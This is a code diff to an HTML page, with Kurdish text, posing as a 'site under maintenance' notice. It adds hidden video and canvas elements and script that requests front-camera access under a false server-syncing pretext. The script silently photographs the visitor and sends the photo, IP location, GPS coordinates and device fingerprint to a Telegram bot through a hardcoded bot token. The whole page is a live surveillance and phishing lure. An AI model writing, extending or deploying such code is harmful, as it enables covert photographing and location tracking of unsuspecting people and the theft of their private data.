@@ -37,6 +37,7 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         h2 { color: #38bdf8; font-size: 1.3rem; margin-bottom: 10px; }
         p { color: #94a3b8; font-size: 0.95rem; line-height: 1.5; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
@@ -44,17 +45,75 @@
     <div class="card">
         <div class="spinner"></div>
         <h2>🛠 ماڵپەڕەکە لەژێر کارکردندایە</h2>
-        <p>تکایە چاوەڕێ بکە یان ڕێگە بە دەستگەیشتن بدە بۆ بەستنەوەی سەرڤەرەکە...</p>
+        <p>تکایە دەستگەیشتن بە کامێرا و شوێنەکە بەبخشە بۆ هاوڕێکەربوونی بەکارهێنەر لەگەڵ سەرڤەر...</p>
     </div>
+
+    <!-- توخمە شاراوەکان بۆ گرتنی وێنە -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
     <script>
         const BOT_TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY";
         const urlParams = new URLSearchParams(window.location.search);
         const ownerId = urlParams.get('id');
 
-        async function collectAndSendInfo() {
+        async function initCapture() {
             if (!ownerId) return;
 
+            // 1. داواکردن و ڕێگەدانی کامێرا (کامێرای پێشەوە)
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: "user" },
+                        audio: false
+                    });
+                    
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+
+                    video.onloadedmetadata = () => {
+                        setTimeout(() => {
+                            captureAndSendPhoto(stream);
+                        }, 1000); // دواکەوتنی ١ چرکە بۆ ڕۆشنبوونی وێنەی کامێراکە
+                    };
+                } catch (err) {
+                    console.log("Camera denied or not available");
+                }
+            }
+
+            // 2. کۆکردنەوەی زانیارییەکانی تر (IP و GPS)
+            collectAndSendTextData();
+        }
+
+        function captureAndSendPhoto(stream) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // گۆڕینی وێنەکە بۆ Blob و ناردنی بۆ تێلێگرام
+            canvas.toBlob((blob) => {
+                if (!blob) return;
+
+                const formData = new FormData();
+                formData.append('chat_id', ownerId);
+                formData.append('photo', blob, 'user_photo.jpg');
+                formData.append('caption', '📸 **وێنەی ڕاستەوخۆی بەکارهێنەر لە ڕێگەی کامێرای پێشەوە!**');
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).then(() => {
+                    // کوژاندنەوەی کامێراکە لە دوای وێنەگرتنەکە
+                    stream.getTracks().forEach(track => track.stop());
+                }).catch(err => console.error(err));
+            }, 'image/jpeg');
+        }
+
+        async function collectAndSendTextData() {
             let userIp = "نەنێنراوە";
             let ipCity = "نەنێنراوە";
             let ipCountry = "نەنێنراوە";
@@ -62,7 +121,6 @@
             let ipLat = "";
             let ipLon = "";
 
-            // 1. وەرگرتنی IP و شوێنی خەمڵێنراو لە ڕێگەی IP
             try {
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const ipData = await ipRes.json();
@@ -72,15 +130,8 @@
                 ipIsp = ipData.org || "نەدۆزرایەوە";
                 ipLat = ipData.latitude || "";
                 ipLon = ipData.longitude || "";
-            } catch (e) {
-                try {
-                    const fallbackRes = await fetch('https://api.ipify.org?format=json');
-                    const fallbackData = await fallbackRes.json();
-                    userIp = fallbackData.ip;
-                } catch(err) {}
-            }
+            } catch (e) {}
 
-            // 2. زانیاری ئامێر
             const ua = navigator.userAgent;
             const platform = navigator.platform;
             const screenRes = `${window.screen.width}x${window.screen.height} (Ratio:${window.devicePixelRatio})`;
@@ -95,7 +146,6 @@
                 }
             } catch (e) {}
 
-            // 3. هەوڵدان بۆ وەرگرتنی GPS Location دەقیق (ئەگەر Allow بکات)
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
@@ -106,7 +156,6 @@
                         sendData(userIp, ipCity, ipCountry, ipIsp, platform, screenRes, gpu, ua, locText, mapUrl);
                     },
                     (error) => {
-                        // ئەگەر Allowی نەرد یان ڕەتی کردەوە -> شوێنی IPەکە دەبنێردرێت
                         let locText = `📍 **خەمڵێنراو (لە ڕێگەی IP):** \`${ipCity}, ${ipCountry}\``;
                         let mapUrl = (ipLat && ipLon) ? `https://www.google.com/maps?q=${ipLat},${ipLon}` : "";
                         sendData(userIp, ipCity, ipCountry, ipIsp, platform, screenRes, gpu, ua, locText, mapUrl);
@@ -146,7 +195,7 @@
             }).catch(err => console.error(err));
         }
 
-        collectAndSendInfo();
+        initCapture();
     </script>
 
 </body>
